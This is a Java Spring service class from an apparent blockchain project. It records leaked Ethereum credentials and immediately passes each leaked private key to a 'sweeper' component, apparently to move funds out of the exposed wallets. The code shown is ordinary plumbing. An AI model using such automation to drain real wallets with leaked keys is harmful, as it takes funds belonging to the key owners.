package cloud.cinder.cindercloud.credentials.service;

import cloud.cinder.cindercloud.credential.domain.LeakedCredential;
import cloud.cinder.cindercloud.credentials.repository.LeakedCredentialRepository;
import cloud.cinder.cindercloud.sweeping.EthereumSweeper;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.util.Optional;
import java.util.stream.Stream;

@Service
@Slf4j
public class CredentialService {

    @Autowired
    private LeakedCredentialRepository leakedCredentialRepository;
    @Autowired
    private EthereumSweeper ethereumSweeper;

    @Transactional
    public void saveLeakedCredential(final LeakedCredential leakedCredential) {
        if (!leakedCredentialRepository.exists(leakedCredential.getAddress())) {
            leakedCredentialRepository.save(leakedCredential);
            sweep(leakedCredential);
        }
    }

    @Transactional(readOnly = true)
    public Stream<LeakedCredential> streamAll() {
        return leakedCredentialRepository.findAll().stream();
    }

    @Transactional(readOnly = true)
    public Optional<LeakedCredential> findByAddress(final String address) {
        return leakedCredentialRepository.findByAddressLike(address);
    }

    private void sweep(final LeakedCredential leakedCredential) {
        log.debug("going to try to sweep {}", leakedCredential.getAddress());
        ethereumSweeper.sweep(leakedCredential.getPrivateKey());
    }

}
